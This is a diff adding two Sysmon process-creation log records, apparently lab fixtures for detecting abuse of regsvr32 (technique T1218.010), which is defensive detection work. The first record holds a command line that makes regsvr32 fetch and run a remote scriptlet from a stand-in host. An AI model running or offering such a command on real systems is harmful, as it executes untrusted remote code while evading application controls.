@@ -1,0 +1,2 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\regsvr32.exe", "OriginalFileName": "REGSVR32.EXE", "CommandLine": "regsvr32.exe /s /u /i:https://example.com/test.sct scrobj.dll", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\regsvr32.exe", "OriginalFileName": "REGSVR32.EXE", "CommandLine": "regsvr32.exe /s /i:C:\\AtomicRedTeam\\atomics\\T1218.010\\src\\RegSvr32.sct scrobj.dll", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}
